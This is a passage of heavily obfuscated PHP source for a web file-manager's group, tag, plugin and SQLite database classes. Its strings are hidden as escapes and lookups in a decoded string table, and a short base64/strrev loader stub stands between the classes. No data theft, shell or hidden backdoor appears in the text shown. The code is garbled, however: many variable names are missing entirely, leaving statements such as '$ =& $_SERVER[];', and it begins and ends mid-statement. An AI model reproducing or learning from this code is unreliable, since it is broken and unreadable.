(!$ݞ) { return !1; } $ = array(); foreach ($ݞ as $) { $[] = "\x73\145\x6c\x65\143\x74\x20\147\x72\157\165\160\111\x44\40\x66\x72\x6f\x6d\40\140\x67\162\157\x75\x70\140\x20\167\x68\145\x72\x65\x20\x70\x61\x72\145\156\x74\x4c\x65\166\x65\x6c\x20\x6c\x69\x6b\145\40\x27{$[$܊[604]]}{$[$܊[1489]]}\x2c\45\47"; } $ = implode($܊[2272], $); $ݞ = $this->query($); if (!$ݞ) { return array(); } $Ā = array_to_keyvalue($ݞ, $܊[12], $܊[1489]); return array_unique($Ā); } public function listByID($נ) { $Ã =& $_SERVER[]; if (!$נ) { return array(); } $͡ԫ = array($Ã[1489] => array($Ã[7], $נ)); $ = $this->where($͡ԫ)->select(); $ = array_sort_keep($, $Ã[1489], $נ); $this->_listDataApply($); return $; } public function listSearch($) { $ =& $_SERVER[]; $͊ = trim($[$[2273]]); $ = explode($[53], $͊); if (!$͊ || count($) == 1) { return $this->listSearchNow($); } $崭 = array($[446] => array()); foreach ($ as $) { if (!trim($)) { continue; } $[$[2273]] = $; $覡 = $this->listSearchNow($); $崭[$[446]] = array_merge($崭[$[446]], $覡[$[446]]); } $崭[$[446]] = array_unique_by_key($崭[$[446]], $[1489]); $崭[$[443]] = array($[444] => count($崭[$[446]]), $[439] => 20, $[428] => 1, $[445] => 1); return $崭; } public function listSearchNow($þ) { $ =& $_SERVER[]; $뫴 = trim($þ[$[2273]]); $Ɂ˅ = isset($þ[$[2274]]) ? $þ[$[2274]] : !1; if (!trim($뫴)) { return !1; } $뫴 = str_replace($[2275], $[2276], $뫴); $ = array($[1489] => array($[473], "{$뫴}\45"), $[32] => array($[473], "\45{$뫴}\45"), $[1162] => $[2277]); if ($Ɂ˅) { $ߘ = $this->getInfoSimple($Ɂ˅); $ݷ = $ߘ[$[604]] . $Ɂ˅ . $[636]; $ = array($, array($[604] => array($[473], $ݷ))); } $ = $this->parseWhereLike($); $ܯ = $this->_makeOrder()->where($)->selectPage(20); $ܯ = $ܯ ? $ܯ : array($[446] => array(), $[443] => array()); if (!$ܯ || count($ܯ[$[446]]) < 5 && Input::check($뫴, $[393])) { $ȧ = $this->groupChildrenAll($Ɂ˅); $ӄ = $this->_searchFromMeta($[551], $뫴, 10, $ȧ); $𚡝 = $this->_searchFromMeta($[552], $뫴, 10, $ȧ); $ = array_merge($ӄ, $𚡝, $ܯ[$[446]]); $ܯ[$[446]] = array_unique_by_key($, $[1489]); $ܯ[$[443]][$[444]] = count($ܯ[$[446]]); $ܯ[$[443]][$[445]] = ceil($ܯ[$[443]][$[444]] / $ܯ[$[443]][$[439]]); } $this->_listDataApply($ܯ[$[446]]); return $ܯ; } protected function groupChildrenAll($鶑) { $Ԇ =& $_SERVER[]; if (!$鶑) { return !1; } if (!is_array($鶑)) { $鶑 = array($鶑); } $ = $鶑; foreach ($鶑 as $) { $׌ = $this->getInfoSimple($); $衅 = array($Ԇ[604] => array($Ԇ[473], $׌[$Ԇ[604]] . $ . $Ԇ[636])); $Ä = $this->field($Ԇ[1489])->where($衅)->select(); $ = array_merge($, array_to_keyvalue($Ä, $Ԇ[12], $Ԇ[1489])); } return array_unique($); } private function _searchFromMeta($Ҁ, $낦, $, $圊) { $ӥ =& $_SERVER[]; $낦 = strtolower($낦); $ˆ = array($ӥ[95] => $Ҁ, $ӥ[451] => array($ӥ[473], "\45{$낦}\x25")); $ˆ = $this->parseWhereLike($ˆ); if ($圊) { $ˆ[$ӥ[1489]] = array($ӥ[7], $圊); } $ = Model($ӥ[2278])->where($ˆ)->limit($)->select(); if (!$) { return array(); } $ = array_to_keyvalue($, $ӥ[12], $ӥ[1489]); $£ = $this->where(array($ӥ[2262] => array($ӥ[7], $)))->select(); if (!$£) { return array(); } return $£; } protected function _listDataApplyItem($Ҡ) { $饁 = array($Ҡ); $this->_listDataApply($饁); return $饁[0]; } protected function _listDataApply(&$Đ) { $͗ =& $_SERVER[]; if (!$Đ) { return; } $Ά = array_to_keyvalue($Đ, $͗[12], $͗[1489]); $this->_listAppendChildren($Đ); $this->_listAppendChildrenMember($Đ); $this->_listAppendMeta($Đ, $Ά); $this->_listAppendParent($Đ); $this->_listAppendSourceRoot($Đ, $Ά); } private function _listAppendChildren(&$𰙊) { $ =& $_SERVER[]; $ = array_to_keyvalue($𰙊, $[12], $[1489]); $ = array($[190] => array($[7], $)); $Թ = array($[190], $[2279] => $[585]); $ = $this->field($Թ)->where($)->group($[190])->select(); $ = array_to_keyvalue($, $[190], $[585]); foreach ($𰙊 as &$ށ) { $ߓ = $ށ[$[1489]]; $ށ[$[2280]] = isset($[$ߓ]) ? intval($[$ߓ]) : !1; } unset($ށ); } private function _listAppendChildrenMember(&$) { $գ =& $_SERVER[]; $ⴻ = array_to_keyvalue($, $գ[12], $գ[1489]); $ = array($գ[1489] => array($գ[7], $ⴻ)); $ = array($գ[1489], $գ[2279] => $գ[585]); $۬ = Model($գ[2269])->field($)->where($)->group($գ[1489])->select(); $ = array_to_keyvalue($۬, $գ[1489], $գ[585]); foreach ($ as &$Դ) { $ = $Դ[$գ[1489]]; $Դ[$գ[2281]] = isset($[$]) ? intval($[$]) : !1; } unset($Դ); } private function _listAppendMeta(&$Ч׿, $) { $ =& $_SERVER[]; $ܠ = array($[1489] => array($[7], $)); $Τ = Model($[2268])->where($ܠ)->select(); $Τ = array_to_keyvalue_group($Τ, $[1489]); foreach ($Τ as &$) { $ = array_to_keyvalue($, $[95], $[451]); } unset($); foreach ($Ч׿ as &$Ҩĳ) { $Ҩĳ[$[555]] = array(); if (isset($Τ[$Ҩĳ[$[1489]]])) { $Ҩĳ[$[555]] = $Τ[$Ҩĳ[$[1489]]]; } } unset($Ҩĳ); } protected function parentLevelArray($) { $ =& $_SERVER[]; $ = explode($[50], trim($, $[50])); $ = array_remove_value($, $[228]); return $; } protected function parentInGroup($նޗ, $) { $ք =& $_SERVER[]; $ӈ = $this->getInfoSimple($նޗ); if (!$ӈ) { return !0; } $ = $this->parentLevelArray($ӈ[$ք[604]]); $[] = $նޗ; foreach ($ as $նޗ) { if (in_array($նޗ . $ք[12], $)) { return !0; } } return !1; } private function _listAppendParent(&$) { $Վ =& $_SERVER[]; $Ө = array(); foreach ($ as &$) { $Ө[$[$Վ[1489]]] = $[$Վ[32]]; $ = $this->parentLevelArray($[$Վ[604]]); foreach ($ as $ȝ) { if (!isset($Ө[$ȝ])) { $Ө[$ȝ] = 0; } } } unset($); foreach ($Ө as $菝 => $ڏ) { if ($ڏ) { continue; } $ = $this->getInfoSimple($菝); $Ө[$菝] = $[$Վ[32]]; } $Ĉ = $GLOBALS[$Վ[6]][$Վ[92]][$Վ[2282]]; if (KodUser::isRoot()) { $Ĉ = !1; } foreach ($ as &$) { $ = $this->parentLevelArray($[$Վ[604]]); $ = $Վ[12]; foreach ($ as $菝 => $ȝ) { if ($Ĉ && $菝 == 0) { continue; } $ .= $Ө[$ȝ] . $Վ[8]; } if ($) { $ .= $[$Վ[32]]; } $[$Վ[609]] = str_replace($Վ[254], $Վ[8], $); } unset($); } private function _listAppendSourceRoot(&$ú, $) { $ǝ =& $_SERVER[]; $ = Model($ǝ[927])->listSourceRoot(SourceModel::TYPE_GROUP, $); $ = array_to_keyvalue($, $ǝ[589]); $ = array_remove_key($, $ǝ[589]); foreach ($ú as &$ӸЎ) { $ӸЎ[$ǝ[90]] = $[$ӸЎ[$ǝ[1489]]] ? $[$ӸЎ[$ǝ[1489]]] : array(); } unset($ӸЎ); } protected function groupMerge($㶐) { $㶐 = array_values(array_unique($㶐)); $ = array(); for ($Λ = 0; $Λ < count($㶐); $Λ++) { $¥ = !1; for ($ = 0; $ < count($㶐); $++) { if ($Λ == $) { continue; } if ($this->isParentOf($㶐[$], $㶐[$Λ])) { $¥ = !0; break; } } if (!$¥) { $[] = $㶐[$Λ]; } } return $; } protected function isParentOf($, $) { $ =& $_SERVER[]; if (!$ || !$ || $ == $) { return !1; } $ = $this->getInfoSimple($); $ħ = $this->getInfoSimple($); $ = $[$[604]] . $ . $[50]; if (substr($ħ[$[604]], 0, strlen($)) == $) { return !0; } return !1; } public function groupShowRoot($߾, $Ҡ = false) { $꒲Ƃ =& $_SERVER[]; $ = $this->getInfo($߾); if (!$) { return array(); } $Ǖ = $this->parentLevelArray($[$꒲Ƃ[604]]); $ = array($߾); if (count($Ǖ) == 0) { return $; } if ($Ҡ && count($Ǖ) == 1) { return $; } if (!$[$꒲Ƃ[555]] || !isset($[$꒲Ƃ[555]][$꒲Ƃ[2263]]) || $[$꒲Ƃ[555]][$꒲Ƃ[2263]] == $꒲Ƃ[938]) { return $this->groupShowRoot($Ǖ[count($Ǖ) - 1], $Ҡ); } if ($[$꒲Ƃ[555]][$꒲Ƃ[2263]] == $꒲Ƃ[432]) { $ = explode($꒲Ƃ[50], $[$꒲Ƃ[555]][$꒲Ƃ[2264]]); if ($) { $ = array_merge($, $); } } return $; } protected function resetParentLevel() { $ =& $_SERVER[]; $ = $[1489]; $ڹ = $this->select(); $ڹ = array_to_keyvalue($ڹ, $); foreach ($ڹ as $) { $ꨘ = $; $ = array(); while ($ꨘ[$[190]] != 0) { $[] = $ꨘ[$[190]]; $ꨘ = $ڹ[$ꨘ[$[190]]]; } $[] = 0; $ = $[50] . implode($[50], array_reverse($)) . $[50]; $this->setNamePinyin($[$], $[$[32]]); $this->where(array($ => $[$]))->save(array($[674] => $)); } return $ڹ; } public function groupNameAuto($, $蟿) { $ƕ =& $_SERVER[]; $ܓ = $this->where(array($ƕ[492] => $))->getField($ƕ[32], !0); if (!$ܓ || !in_array($蟿, $ܓ)) { return $蟿; } for ($Ș = 1; $Ș <= count($ܓ) + 1; $Ș++) { $մр = $蟿 . "\50{$Ș}\51"; if (!in_array($մр, $ܓ)) { return $մр; } } } public function groupSwitch($ڢ, $矽) { $ =& $_SERVER[]; $ӛ = array($[1489] => array($[7], array($ڢ, $矽))); $ð = $this->where($ӛ)->select(); $ð = array_to_keyvalue($ð, $[1489]); $ = _get($ð, $ڢ); $֠ = _get($ð, $矽); if (!$ || !$֠ || $[$[190]] == 0) { return !1; } if ($[$[1489]] == $֠[$[1489]]) { return !1; } if (strpos($֠[$[604]], $[$[604]] . $[$[1489]] . $[50]) === 0) { return !1; } $ӛ = array($[1489] => $ڢ); $̓ = Model($[2269])->where($ӛ)->select(); if (!$̓) { $̓ = array(); } foreach ($̓ as $܋Վ) { $ = $܋Վ[$[1586]]; $ӛ = array($[1586] => $, $[1489] => $矽); $ = Model($[2269])->where($ӛ)->find(); if (!$) { $ = array($矽 => $܋Վ[$[1634]]); Model($[617])->userGroupAdd($, $); } Model($[617])->userGroupRemove($, $ڢ); } $ӛ = array($[188] => 2, $[190] => 0, $[500] => 1, $[589] => array($[7], array($ڢ, $矽))); $ = Model($[927])->where($ӛ)->field($[2283])->select(); $ = array_to_keyvalue($, $[589], $[191]); $ϡ = !empty($[$ڢ]) ? $[$ڢ] : !1; if ($ϡ) { if (!$[$矽]) { $[$矽] = Model($[927])->groupRootAdd($矽); } $ = $[$矽]; $ӛ = array($[190] => $ϡ); $ = Model($[927])->where($ӛ)->field($[2284])->select(); if (!$) { $ = array(); } Model($[927])->moveClearAuth = !1; foreach ($ as $֚) { $ = $֚[$[500]] == $[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($[927])->move($֚[$[191]], $, $); } Model($[927])->moveClearAuth = !0; $ӛ = array($[188] => 2, $[589] => $ڢ); $ = array($[589] => $矽); Model($[2285])->where($ӛ)->save($); Model($[2286])->where($ӛ)->save($); } $this->_changeChildLevel($ð[$ڢ], $ð[$矽], !0); $this->where(array($[190] => $ڢ))->save(array($[190] => $矽)); $this->_clearChildrenCache($ð[$矽]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($) { $ =& $_SERVER[]; return array($[2287] => array($[0], $[2288]), $[2289] => array($[0], $[2290])); } protected function ___get($) { $þ =& $_SERVER[]; $Ϋ = Model($þ[605])->metaGet($, $þ[2291]); $ʙ = json_decode($Ϋ, !0); return $ʙ ? $ʙ : array($þ[2292] => $þ[91], $þ[446] => array()); } protected function ___listData($) { $ =& $_SERVER[]; $ = array($[1961] => 0, $[573] => array($[2293], 0), $[511] => $[1485] . $); $잕 = $[2294]; $ = $this->field($잕)->where($)->order($[2295])->select(); return $ ? $ : array(); } protected function set($ت, $ڃ) { $ɇ =& $_SERVER[]; $ڃ = $ڃ ? $ڃ : array($ɇ[2292] => $ɇ[91], $ɇ[446] => array()); return Model($ɇ[605])->metaSet($ت, $ɇ[2291], json_encode($ڃ)); } protected function getByTagID($˜, $) { $ =& $_SERVER[]; if (!$˜ || !$) { return !1; } if (!Model($[605])->getInfoSimple($˜)) { return !1; } $ = $this->get($˜); if (!$ || !isset($[$[446]])) { return !1; } $۲ʳ = array_find_by_field($[$[446]], $[487], $); return is_array($۲ʳ) ? $۲ʳ : !1; } public function listSource($, $) { $û =& $_SERVER[]; if ($ && !is_array($)) { $ = array($); } $ֺ = $this->get($); $Ǖ = array_to_keyvalue($ֺ[$û[446]], $û[487]); $ = array_to_keyvalue($ֺ[$û[598]], $û[487]); $ = $this->listData($); $Ե٬ = array(); foreach ($ as $γ) { $Ԯч = $Ǖ[$γ]; $ݽޏ = _get($Ԯч, $û[598]); if (!$Ԯч || !$ݽޏ || !$[$ݽޏ]) { continue; } if (!$Ե٬[$ݽޏ]) { $Ե٬[$ݽޏ] = array(); } $Ե٬[$ݽޏ][] = $γ; } $ = array(); $ = array(); foreach ($ as $ᕧ) { $ = $ᕧ[$û[87]]; $Ԯч = $Ǖ[$ᕧ[$û[515]]]; $ݽޏ = _get($Ԯч, $û[598]); if (!$Ԯч || !$ݽޏ || !$Ե٬[$ݽޏ] || !$) { continue; } if (!in_array($ᕧ[$û[515]], $Ե٬[$ݽޏ])) { continue; } if (!$[$]) { $[$] = array(); } $[$][] = $ݽޏ; } foreach ($ as $ => $⴪) { if (count($⴪) != count($Ե٬)) { continue; } $[] = $; } if (!$) { $ = array_to_keyvalue($, $û[12], $û[87]); } $ = array_unique($); if (!$) { return array(); } $ӽ = array($û[506] => array($û[507], $), $û[589] => $, $û[188] => SourceModel::TYPE_GROUP); $Ģ = Model($û[1527])->listSource($ӽ); if (!$Ģ || count($) == $Ģ[$û[443]][$û[444]]) { return $Ģ; } $ׄ = array(); $ꔗ = array_to_keyvalue($Ģ[$û[85]], $û[12], $û[191]); $؀ = array_to_keyvalue($Ģ[$û[86]], $û[12], $û[191]); $ = array_merge($؀, $ꔗ); foreach ($ as $) { if (!in_array($, $)) { $ׄ[] = $; } } if ($ׄ) { $this->removeBySource($, $ׄ); } return $Ģ; } protected function addToTag($첪, $貢, $쟹) { $ =& $_SERVER[]; if (!$this->getByTagID($첪, $쟹) || !$貢) { return !1; } if (!Model($[927])->pathInfo($貢)) { return !1; } $ = array($[1961] => 0, $[573] => $쟹, $[510] => $貢, $[511] => $[2296] . $첪, $[509] => $[12], $[2179] => 0); if ($this->where($)->find()) { return !1; } return $this->add($); } protected function removeFromTag($΢, $Ā, $) { $ =& $_SERVER[]; if (!$this->getByTagID($΢, $) || !$Ā) { return !1; } if (is_array($Ā)) { $Ā = array($[7], $Ā); } $厌 = array($[1961] => 0, $[573] => $, $[511] => $[2296] . $΢, $[510] => $Ā); return $this->where($厌)->delete(); } protected function removeByTag($Ә, $) { $ =& $_SERVER[]; if (!$this->getByTagID($Ә, $)) { return !1; } $Ő = array($[1961] => 0, $[573] => $, $[511] => $[2296] . $Ә); return $this->where($Ő)->delete(); } protected function removeBySource($ȱ, $ݫ) { $󏭋 =& $_SERVER[]; if (!$ȱ || !$ݫ) { return !1; } if (is_array($ݫ)) { $ݫ = array($󏭋[7], $ݫ); } $˞ = array($󏭋[1961] => 0, $󏭋[510] => $ݫ, $󏭋[573] => array($󏭋[1176], 0), $󏭋[511] => $󏭋[2296] . $ȱ); return $this->where($˞)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\160\x6c\x75\147\x69\156\x4c\151\x73\164"; public $field = array("\x6e\141\155\145", "\x73\164\141\164\165\x73", "\162\145\147\x69\145\163\164", "\143\157\156\146\x69\x67"); public function loadList($Ĺ = false) { $ = array_to_keyvalue($this->listData(), $_SERVER[][32]); if ($Ĺ) { return $[$Ĺ]; } return $; } public function init() { $٭ =& $_SERVER[]; Hook::trigger($٭[2297]); $ = $this->loadPluginList(); foreach ($ as $ => $ʃ) { $ = $this->appAllow($, $ʃ); if (!$) { continue; } foreach ($ʃ[$٭[2298]] as $嘾 => $֝) { Hook::bind($嘾, $֝); } } Hook::trigger($٭[2299]); Hook::trigger(ACTION); } public function appAllow($, $י, $ = true) { $Ő =& $_SERVER[]; $ˎ۫ = PLUGIN_DIR . $ . $Ő[2300]; if (!is_array($י) || !is_array($י[$Ő[2298]]) || $י[$Ő[844]] != 1 || !is_file($ˎ۫)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ő[6]][$Ő[2301]] || !$GLOBALS[$Ő[6]][$Ő[2302]]) { return !0; } $ɒ = explode($Ő[50], strtolower($GLOBALS[$Ő[6]][$Ő[2302]])); return in_array(strtolower($), $ɒ) ? !1 : !0; } if ($ && !Action($Ő[2303])->checkAuth($)) { return !1; } return !0; } public function unInstall($) { $ =& $_SERVER[]; $ϧӴ = $this->loadList($); if (file_exists(PLUGIN_DIR . $)) { Hook::apply($ . $[2304]); } $this->remove($ϧӴ[$[487]]); } public function changeStatus($Ī去, $Χκ) { $Ȼ =& $_SERVER[]; $݊ = $this->loadList($Ī去); if ($Χκ) { Hook::apply($Ī去 . $Ȼ[2305]); } $this->update($݊[$Ȼ[487]], array($Ȼ[2306] => $Χκ)); } public function appRegist($, $đ) { $ =& $_SERVER[]; $ = $this->loadList($); if ($) { $this->update($[$[487]], array($[2298] => $đ)); } else { $ = array($[32] => $, $[2298] => $đ, $[844] => 0, $[6] => $this->getConfigDefault($)); $this->insert($); } } public function getConfigDefault($Ꟑ) { $Ñݫ =& $_SERVER[]; $ = array(); $ = $this->getPackageJson($Ꟑ); if (!$ && is_array($[$Ñݫ[2307]])) { return $; } foreach ($[$Ñݫ[2307]] as $ݛܫ => $) { if (!isset($[$Ñݫ[451]]) || isset($[$ݛܫ])) { continue; } $[$ݛܫ] = $[$Ñݫ[451]]; } return $; } public function getPackageJson($Ę) { return Hook::apply($Ę . $_SERVER[][2308]); } public function getConfig($տ, $ߧ = false) { $ =& $_SERVER[]; $҅ = array(); $ = $this->loadList($տ); if ($ && is_array($[$[6]])) { $҅ = $[$[6]]; } if (!$҅ || $ߧ) { $҅ = $this->getConfigDefault($տ); } return $҅; } public function setConfig($̯, $ǡ = false) { $־ =& $_SERVER[]; $ = $this->loadList($̯); if (!$) { return !1; } $ڴ = $[$־[6]]; if ($ǡ == !1) { $ڴ = array(); $ǡ = $this->getConfigDefault($̯); } foreach ($ǡ as $ެ => $Ɔ) { $ڴ[$ެ] = is_string($Ɔ) ? trim($Ɔ) : $Ɔ; } $this->update($[$־[487]], array($־[6] => $ڴ)); } public function viewList() { $ =& $_SERVER[]; $ɋ = $this->loadList(); $this->pluginScan($ɋ); $ɋ = $this->loadPluginList(); $ܫ = array(); foreach ($ɋ as $ņ => $Ýѕ) { $轨 = $Ýѕ; unset($Ýѕ[$[2298]], $Ýѕ[$[6]]); $ʁΉ = PLUGIN_DIR . $Ýѕ[$[32]] . $[2300]; if (!is_file($ʁΉ)) { continue; } $ײƬ = Hook::apply($Ýѕ[$[32]] . $[2308]); if (!is_array($ײƬ)) { continue; } $ܫ[$ņ] = array_merge($Ýѕ, $ײƬ); if ($轨[$[6]][$[1884]] != $ײƬ[$[1858]]) { Hook::apply($Ýѕ[$[32]] . $[2305]); $轨[$[6]][$[1884]] = $ײƬ[$[1858]]; $this->update($Ýѕ[$[487]], array($[6] => $轨[$[6]])); } } return $ܫ; } private function loadPluginList() { $ =& $_SERVER[]; $ = $this->loadList(); if (strtolower(MOD) == $[2309]) { return $; } $仦 = Hook::trigger($[2310], $); if ($ && !$仦) { die; } return $仦 ? $仦 : $; } private function pluginScan($ӹކ) { $ܔ =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $枕ƻ, $, 0); foreach ($枕ƻ as $ޫ) { $؎ = get_path_this($ޫ); if (isset($ӹކ[$؎]) || !file_exists($ޫ . $ܔ[2311]) || !file_exists($ޫ . $ܔ[2300])) { continue; } Hook::apply($؎ . $ܔ[2305]); } } } goto f܇; eӨҽ: $fileSize = strrev(base64_decode($_SERVER[][0])); function binCheckNeq($, $Ҙ) { return $ != $Ҙ; } $_SERVER[$_SERVER[][1]] = $fileSize($_SERVER[$_SERVER[][2]]); goto D; E: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ =& $_SERVER[]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$[6]] =& $config; $this->values[$[7]] =& $in; $this->tpl = TEMPLATE . MOD . $[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ҟ) { if (1 === func_num_args()) { $this->{$Ҟ} = new $Ҟ(); } else { $ѱ = new ReflectionClass($Ҟ); $ = func_get_args(); array_shift($); $this->{$Ҟ} = $ѱ->newInstanceArgs($); } return $this->{$Ҟ}; } public function routeBind($, $﹇, $󺹜 = 3) { $ǰ䫬 =& $_SERVER[]; $˶ = $this->in[$ǰ䫬[9]]; $ = str_replace($ǰ䫬[10], $ǰ䫬[11], trim(trim($, $ǰ䫬[8]), $ǰ䫬[12])); if (!$ || count($˶) <= $󺹜) { return !1; } $ = !0; $ = explode($ǰ䫬[8], $); for ($ = 0; $ < count($); $++) { if ($[$] != $˶[$󺹜 + $]) { $ = !1; break; } } if (!$) { return; } call_user_func_array(array($this, $﹇), array()); } public function routeArgs($ = 3) { $ = $this->in[$_SERVER[][9]]; if (count($) <= $) { return array(); } $ = array(); for ($ = $; $ < count($); $ += 2) { $[$[$]] = $[$ + 1]; $this->in[$[$]] = $[$ + 1]; } return $; } protected function assign($, $٠) { $this->values[$] = $٠; } protected function display($Ɨ) { ob_end_clean(); extract($this->values); require $this->tpl . $Ɨ; } } class DbSqliteBase extends Db { public function __construct($ = '') { $ =& $_SERVER[]; if (!extension_loaded($[13])) { think_exception(think_lang($[14]) . $[15]); } if (!empty($)) { if (!isset($[$[16]])) { $[$[16]] = 438; } $this->config = $; if (empty($this->config[$[17]])) { $this->config[$[17]] = array(); } } } public function connect($ÕƇ = '', $㐎 = 0) { $ =& $_SERVER[]; if (!isset($this->linkID[$㐎])) { if (empty($ÕƇ)) { $ÕƇ = $this->config; } $ˋ = !empty($ÕƇ[$[17]][$[18]]) ? $ÕƇ[$[17]][$[18]] : $this->pconnect; $ = $ˋ ? $[19] : $[20]; $this->linkID[$㐎] = $($ÕƇ[$[21]], $ÕƇ[$[16]]); if (!$this->linkID[$㐎]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$㐎], 30000); if (1 != think_config($[22])) { unset($this->config); } } return $this->linkID[$㐎]; } public function free() { $this->queryID = null; } public function query($ǌ) { $ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ǌ; if ($this->queryID) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->queryID = sqlite_query($this->_linkID, $ǌ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ = $this->getAll(); return $; } } public function execute($ۤ) { $խ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ۤ; if ($this->queryID) { $this->free(); } think_action_status($խ[25], 1); think_status($խ[24]); $ = sqlite_exec($this->_linkID, $ۤ); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = sqlite_query($this->_linkID, $_SERVER[][27]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ޡ = sqlite_query($this->_linkID, $_SERVER[][28]); if (!$ޡ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $㎏ = array(); if ($this->numRows > 0) { for ($ۃ = 0; $ۃ < $this->numRows; $ۃ++) { $㎏[$ۃ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $㎏; } public function getFields($򀚃) { $̹ =& $_SERVER[]; $闟 = $this->query($̹[29] . $򀚃 . $̹[30]); $ = array(); if ($闟) { foreach ($闟 as $̂҉ => $) { $[$[$̹[31]]] = array($̹[32] => $[$̹[31]], $̹[33] => $[$̹[34]], $̹[35] => (bool) ($[$̹[36]] === $̹[12]), $̹[37] => $[$̹[38]], $̹[39] => strtolower($[$̹[40]]) == $̹[41], $̹[42] => strtolower($[$̹[43]]) == $̹[44]); } } return $; } public function getTables($Ҭ = '') { $Ł =& $_SERVER[]; $ = $this->query($Ł[45] . $Ł[46] . $Ł[47]); $ = array(); foreach ($ as $ => $Ӏ) { $[$] = current($Ӏ); } return $; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ܵ =& $_SERVER[]; $堓۸ = sqlite_last_error($this->_linkID); $this->error = $堓۸ . $ܵ[4] . sqlite_error_string($堓۸); if ($ܵ[12] != $this->queryStr) { $this->error .= LNG($ܵ[48]) . $this->queryStr; } think_trace($this->error, $ܵ[12], $ܵ[49]); return $this->error; } public function escapeString($) { return sqlite_escape_string($); } public function parseLimit($ن) { $Ԍ =& $_SERVER[]; $ί = $Ԍ[12]; if (!empty($ن)) { $ن = explode($Ԍ[50], $ن); if (count($ن) > 1) { $ί .= $Ԍ[51] . $ن[1] . $Ԍ[52] . $ن[0] . $Ԍ[53]; } else { $ί .= $Ԍ[51] . $ن[0] . $Ԍ[53]; } } return $ί; } } class DbSqlite3Base extends Db { public function __construct($ˈ = '') { $ =& $_SERVER[]; if (!class_exists($[54])) { think_exception(think_lang($[14]) . $[55]); } if (!empty($ˈ)) { if (!isset($ˈ[$[16]])) { $ˈ[$[16]] = 438; } $this->config = $ˈ; if (empty($this->config[$[17]])) { $this->config[$[17]] = array(); } } } public function connect($ř = '', $̜ = 0) { $ø =& $_SERVER[]; if (!isset($this->linkID[$̜])) { if (empty($ř)) { $ř = $this->config; } $this->linkID[$̜] = new SQLite3($ř[$ø[21]]); if (!$this->linkID[$̜]) { think_exception($this->linkID[$̜]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$̜]->busyTimeout(30000); if (1 != think_config($ø[22])) { unset($this->config); } } return $this->linkID[$̜]; } public function free() { $this->queryID = null; } public function query($ݕ̞) { $ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ݕ̞; if ($this->queryID) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->queryID = $this->_linkID->query($ݕ̞); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ҭ = $this->getAll(); $this->numRows = count($ҭ); return $ҭ; } } public function execute($Ԅ) { $Ϥ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ԅ; if ($this->queryID) { $this->free(); } think_action_status($Ϥ[25], 1); think_status($Ϥ[24]); $̫ = $this->_linkID->exec($Ԅ); $this->debug(); if (!1 === $̫) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $օ = $this->_linkID->query($_SERVER[][27]); if (!$օ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->query($_SERVER[][28]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ެ = array(); while ($ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ެ[] = $; } $this->queryID->reset(); return $ެ; } public function getFields($ԙ) { $ߞ =& $_SERVER[]; $ߕԽ = $this->query($ߞ[29] . $ԙ . $ߞ[30]); $ꂼ = array(); if ($ߕԽ) { foreach ($ߕԽ as $ => $) { $ꂼ[$[$ߞ[32]]] = array($ߞ[32] => $[$ߞ[32]], $ߞ[33] => $[$ߞ[33]], $ߞ[35] => (bool) ($[$ߞ[35]] === $ߞ[12]), $ߞ[37] => $[$ߞ[56]], $ߞ[39] => (bool) $[$ߞ[57]], $ߞ[42] => (bool) $[$ߞ[57]]); } } return $ꂼ; } public function getTables($᪗ = '') { $𒊳 =& $_SERVER[]; $ = $this->query($𒊳[45] . $𒊳[46] . $𒊳[47]); $ܬ = array(); foreach ($ as $Ͱ => $덮) { $ܬ[$Ͱ] = current($덮); } return $ܬ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($[12] != $this->queryStr) { $this->error .= LNG($[48]) . $this->queryStr; } think_trace($this->error, $[12], $[49]); return $this->error; } public function escapeString($ڿϔ) { $ϓ =& $_SERVER[]; if ($this->_linkID) { return 